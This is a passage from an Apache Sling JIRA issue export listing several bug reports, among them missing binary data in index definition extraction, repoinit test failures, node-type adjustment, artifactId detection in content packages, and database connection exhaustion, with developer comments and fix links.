                    <description>&lt;p&gt;Currently, binaries are stored in indexDefinitions at &lt;span class=&quot;error&quot;&gt;&amp;#91;1&amp;#93;&lt;/span&gt; and these binaries should be written in JSONOutput at &lt;span class=&quot;error&quot;&gt;&amp;#91;2&amp;#93;&lt;/span&gt;, However each time we are getting it as empty at &lt;span class=&quot;error&quot;&gt;&amp;#91;2&amp;#93;&lt;/span&gt;.&lt;/p&gt;

&lt;p&gt;The reason is that we are storing binaries against its repositoryPath instead it should be its parent path.&lt;/p&gt;

&lt;p&gt;i.e we are storing tika config.xml binaries at repositoryPath&lt;br/&gt;
`oak:index/damAssetLucene-8-custom-2/tika/config.xml`&lt;br/&gt;
and while writing at &lt;span class=&quot;error&quot;&gt;&amp;#91;2&amp;#93;&lt;/span&gt;,we are trying to fetch it from `oak:index/damAssetLucene-8-custom-2/tika/`&lt;br/&gt;
because of this we are getting it as empty as nodeName is till `oak:index/damAssetLucene-8-custom-2/tika` only.&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;error&quot;&gt;&amp;#91;1&amp;#93;&lt;/span&gt;:&lt;a href=&quot;https://github.com/niekraaijmakers/sling-org-apache-sling-feature-cpconverter/blob/master/src/main/java/org/apache/sling/feature/cpconverter/handlers/IndexDefinitionsEntryHandler.java&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/niekraaijmakers/sling-org-apache-sling-feature-cpconverter/blob/master/src/main/java/org/apache/sling/feature/cpconverter/handlers/IndexDefinitionsEntryHandler.java&lt;/a&gt;&lt;br/&gt;
&lt;span class=&quot;error&quot;&gt;&amp;#91;2&amp;#93;&lt;/span&gt;:&lt;a href=&quot;https://github.com/niekraaijmakers/sling-org-apache-sling-feature-cpconverter/blob/master/src/main/java/org/apache/sling/feature/cpconverter/index/IndexDefinitionsJsonWriter.java#L137&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/niekraaijmakers/sling-org-apache-sling-feature-cpconverter/blob/master/src/main/java/org/apache/sling/feature/cpconverter/index/IndexDefinitionsJsonWriter.java#L137&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13514724">SLING-11739</key>
            <summary>Index definition extraction from content packages is missing binary files data</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="abhigarg">Abhishek Garg</assignee>
                                    <reporter username="abhigarg">Abhishek Garg</reporter>
                        <labels>
                    </labels>
                <created>Mon, 19 Dec 2022 10:55:26 +0000</created>
                <updated>Mon, 13 Feb 2023 08:49:03 +0000</updated>
                            <resolved>Wed, 4 Jan 2023 16:20:13 +0000</resolved>
                                    <version>Content-Package to Feature Model Converter 1.1.24</version>
                                    <fixVersion>Content-Package to Feature Model Converter 1.3.0</fixVersion>
                                    <component>Content-Package to Feature Model Converter</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17649265" author="abhigarg" created="Mon, 19 Dec 2022 11:10:49 +0000"  >&lt;p&gt;PR to fix that&lt;br/&gt;
&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/pull/152&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/pull/152&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;cc : &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=rombert&quot; class=&quot;user-hover&quot; rel=&quot;rombert&quot;&gt;rombert&lt;/a&gt; &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=Sc0rpic0m&quot; class=&quot;user-hover&quot; rel=&quot;Sc0rpic0m&quot;&gt;Sc0rpic0m&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17654540" author="rombert" created="Wed, 4 Jan 2023 16:20:13 +0000"  >&lt;p&gt;PR applied, thanks &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=abhigarg&quot; class=&quot;user-hover&quot; rel=&quot;abhigarg&quot;&gt;abhigarg&lt;/a&gt;!&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 42 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1e8g0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11737] jcr-repoinit: SetPropertiesTest failures</title>
                <link>https://issues.apache.org/jira/browse/SLING-11737</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;&lt;span class=&quot;error&quot;&gt;&amp;#91;ERROR&amp;#93;&lt;/span&gt; Tests run: 14, Failures: 0, Errors: 2, Skipped: 0, Time elapsed: 2.824 s &amp;lt;&amp;lt;&amp;lt; FAILURE! - in org.apache.sling.jcr.repoinit.SetPropertiesTest&lt;br/&gt;
&lt;span class=&quot;error&quot;&gt;&amp;#91;ERROR&amp;#93;&lt;/span&gt; org.apache.sling.jcr.repoinit.SetPropertiesTest.setAutocreatedDefaultPropertiesFromPrimaryType  Time elapsed: 0.218 s  &amp;lt;&amp;lt;&amp;lt; ERROR!&lt;br/&gt;
javax.jcr.RepositoryException: Not an absolute path: \one\two&lt;br/&gt;
        at org.apache.jackrabbit.oak.jcr.session.SessionImpl.getOakPathOrThrow(SessionImpl.java:152)&lt;br/&gt;
        at org.apache.jackrabbit.oak.jcr.session.SessionImpl.access$100(SessionImpl.java:82)&lt;br/&gt;
        at org.apache.jackrabbit.oak.jcr.session.SessionImpl$1.performNullable(SessionImpl.java:186)&lt;br/&gt;
        at org.apache.jackrabbit.oak.jcr.session.SessionImpl$1.performNullable(SessionImpl.java:182)&lt;br/&gt;
        at org.apache.jackrabbit.oak.jcr.delegate.SessionDelegate.performNullable(SessionDelegate.java:242)&lt;br/&gt;
        at org.apache.jackrabbit.oak.jcr.session.SessionImpl.getNodeOrNull(SessionImpl.java:182)&lt;br/&gt;
        at org.apache.jackrabbit.oak.jcr.session.SessionImpl.getNode(SessionImpl.java:304)&lt;/p&gt;


&lt;p&gt;likely platform related...?&lt;/p&gt;</description>
                <environment></environment>
        <key id="13514060">SLING-11737</key>
            <summary>jcr-repoinit: SetPropertiesTest failures</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="kwin">Konrad Windszus</assignee>
                                    <reporter username="reschke">Julian Reschke</reporter>
                        <labels>
                    </labels>
                <created>Thu, 15 Dec 2022 14:57:46 +0000</created>
                <updated>Mon, 30 Jan 2023 18:35:17 +0000</updated>
                            <resolved>Tue, 10 Jan 2023 20:59:10 +0000</resolved>
                                                    <fixVersion>Repoinit JCR 1.1.44</fixVersion>
                                    <component>Repoinit</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="1200">20m</timespent>
                                <comments>
                            <comment id="17656968" author="kwin" created="Tue, 10 Jan 2023 20:59:21 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-jcr-repoinit/commit/2f486a8b15438d7051e90f0f559bd11a68896217&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-jcr-repoinit/commit/2f486a8b15438d7051e90f0f559bd11a68896217&lt;/a&gt;.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 41 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1e4cw:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11736] Add &quot;ensure nodes&quot; which should potentially adjust the primary type/mixin types of existing nodes</title>
                <link>https://issues.apache.org/jira/browse/SLING-11736</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Currently &quot;create path ....&quot; is a no-op when the path does already exist (&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-jcr-repoinit/blob/9913b787574186a7a31d184480cec3862816438f/src/main/java/org/apache/sling/jcr/repoinit/impl/AclVisitor.java#L191&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-jcr-repoinit/blob/9913b787574186a7a31d184480cec3862816438f/src/main/java/org/apache/sling/jcr/repoinit/impl/AclVisitor.java#L191&lt;/a&gt;). This is dangerous as then the path might have other primary and mixin types and subsequent calls of &quot;set properties ...&quot; might fail.&lt;br/&gt;
Instead the primary type and mixins should potentially be adjusted on existing nodes as well.&lt;/p&gt;

&lt;p&gt;This happened in &lt;a href=&quot;https://github.com/adobe/aem-project-archetype/issues/997#issuecomment-1351895791&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/adobe/aem-project-archetype/issues/997#issuecomment-1351895791&lt;/a&gt; which lead to not starting the repository at all.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13513654">SLING-11736</key>
            <summary>Add &quot;ensure nodes&quot; which should potentially adjust the primary type/mixin types of existing nodes</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="kwin">Konrad Windszus</assignee>
                                    <reporter username="kwin">Konrad Windszus</reporter>
                        <labels>
                    </labels>
                <created>Wed, 14 Dec 2022 19:11:34 +0000</created>
                <updated>Wed, 8 Feb 2023 13:30:10 +0000</updated>
                            <resolved>Thu, 12 Jan 2023 16:10:31 +0000</resolved>
                                    <version>Repoinit JCR 1.1.42</version>
                                    <fixVersion>Repoinit Parser 1.9.0</fixVersion>
                    <fixVersion>Repoinit JCR 1.1.44</fixVersion>
                                    <component>Repoinit</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="23400">6.5h</timespent>
                                <comments>
                            <comment id="17647685" author="kwin" created="Wed, 14 Dec 2022 19:24:56 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=bdelacretaz&quot; class=&quot;user-hover&quot; rel=&quot;bdelacretaz&quot;&gt;bdelacretaz&lt;/a&gt; Can you come up with a fix?&lt;/p&gt;</comment>
                            <comment id="17647995" author="bdelacretaz" created="Thu, 15 Dec 2022 10:47:17 +0000"  >&lt;p&gt;I won&apos;t be able to work on this right now but what you suggest sounds reasonable to me. If someone else creates a patch I recommend writing tests which clearly demonstrate the changed behavior, as there&apos;s a minor risk of backwards incompatibility.&lt;/p&gt;</comment>
                            <comment id="17656507" author="kwin" created="Tue, 10 Jan 2023 08:39:30 +0000"  >&lt;p&gt;Added the new statement in the parser in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-repoinit-parser/commit/9d7d66aaf244d149124fd491dddf6b90e0172efb&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-repoinit-parser/commit/9d7d66aaf244d149124fd491dddf6b90e0172efb&lt;/a&gt;.&lt;br/&gt;
Implemented it in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-jcr-repoinit/commit/abb28aa77f215f53d4dfa01b4de6d3dd233f20a1&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-jcr-repoinit/commit/abb28aa77f215f53d4dfa01b4de6d3dd233f20a1&lt;/a&gt;.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310560">
                    <name>Problem/Incident</name>
                                            <outwardlinks description="causes">
                                        <issuelink>
            <issuekey id="13523769">SLING-11769</issuekey>
        </issuelink>
            <issuelink>
            <issuekey id="13517663">SLING-11750</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13382548">SLING-10463</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 41 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1e1uo:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11734] ContentPackageScanner does not extract the right artifactId in case of multiple pom.properties</title>
                <link>https://issues.apache.org/jira/browse/SLING-11734</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Currently, the ContentPackageScanner gets the first directory available under the maven meta-inf folder.&lt;/p&gt;

&lt;p&gt;This works most of the time, as there is usually only 1 properties file inside a package.&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;However in some edge cases, there are multiple. And if the order is that in a way that a different package comes first, such as com.google.guava , it will take that one instead.&lt;/p&gt;

&lt;p&gt;Example we are extracting com.acs.aem.acs-aem-commons-content-5.4.3.zip &amp;gt; acs-aem-commons-bundle-5.3.4.jar&lt;/p&gt;

&lt;p&gt;The META-INF/maven folder contains:&lt;/p&gt;

&lt;p&gt;com.google.guava/failureaccess/pom.properties&lt;/p&gt;

&lt;p&gt;com.adobe.acs/acs-aem-commons-bundle/pom.properties&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;Now, the first is picked, com.google.guava/failureaccess/pom.properties&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;What we want is to build in a mechanism that if there are multiple maven properties, the contentpackagescanner will check if one of them has a groupId (first folder) that matches.&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;Since the groupId com.adobe.acs is a match, we can use that to pick the right properties file.&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13513609">SLING-11734</key>
            <summary>ContentPackageScanner does not extract the right artifactId in case of multiple pom.properties</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="Sc0rpic0m">Niek Raaijmakers</reporter>
                        <labels>
                    </labels>
                <created>Wed, 14 Dec 2022 13:56:42 +0000</created>
                <updated>Thu, 28 Sep 2023 13:44:43 +0000</updated>
                            <resolved>Thu, 28 Sep 2023 13:44:39 +0000</resolved>
                                    <version>Feature Model Analyser 1.6.8</version>
                                    <fixVersion>Feature Model Analyser 2.0.0</fixVersion>
                                    <component>Feature Model Analyser</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17647655" author="cziegeler" created="Wed, 14 Dec 2022 18:06:14 +0000"  >&lt;p&gt;I&apos;m not sure if this is the right solution, it works for this case as the bundle happens to have the same group id as the content package. But what if this bundle would be in a content package which has the group id &quot;foo.bar&quot; ?&lt;br/&gt;
So I think, instead of comparing the group id, it is probably better to iterate over all possible candidates, pick the ones which match the version. If there is one, we pick that one. If there is more than one, we can check the artifact id. If there is still more than one (very unlikely) we can use the group id from the parent package or randomly pick one.&lt;/p&gt;</comment>
                            <comment id="17647691" author="cziegeler" created="Wed, 14 Dec 2022 19:46:25 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=Sc0rpic0m&quot; class=&quot;user-hover&quot; rel=&quot;Sc0rpic0m&quot;&gt;Sc0rpic0m&lt;/a&gt; thanks for your PR, I&apos;ve adjusted it a little bit in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature-analyser/pull/43&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-feature-analyser/pull/43&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 45 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1e1ko:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11730] sling database connection exhausted</title>
                <link>https://issues.apache.org/jira/browse/SLING-11730</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;We are using apache sling with following dependencies in our project.&lt;/p&gt;

&lt;p&gt;org.apache.jackrabbit : jackrabbit-core:2.1.1&lt;br/&gt;
org.apache.sling: org.apache.sling.launchpad.base:2.3.0:war&lt;/p&gt;

&lt;p&gt;We are seeing database connection exhaust issue while running on wildfly 20 and oracle 12c.&lt;/p&gt;

&lt;p&gt;Please see the attached error.txt for more details.&lt;/p&gt;

&lt;p&gt;We tried using connection pooling but still the issue persists.&lt;/p&gt;

&lt;p&gt;Attached the repository xmls for your references.&lt;/p&gt;

&lt;p&gt;repository-org.xml ---&amp;gt; Existing one.&lt;/p&gt;

&lt;p&gt;Tried with JNDI&lt;/p&gt;

&lt;p&gt;repository-jndi.xml&lt;/p&gt;

&lt;p&gt;standalone.xml&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;Tried with Datasource&lt;/p&gt;

&lt;p&gt;repository-datasource.xml.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13513365">SLING-11730</key>
            <summary>sling database connection exhausted</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="6">Invalid</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="prasad907109">Prasad Shembekar</reporter>
                        <labels>
                    </labels>
                <created>Tue, 13 Dec 2022 11:42:56 +0000</created>
                <updated>Mon, 19 Dec 2022 08:02:20 +0000</updated>
                            <resolved>Tue, 13 Dec 2022 15:52:18 +0000</resolved>
                                    <version>JCR Jackrabbit Client 2.0.2</version>
                                                    <component>App CMS</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
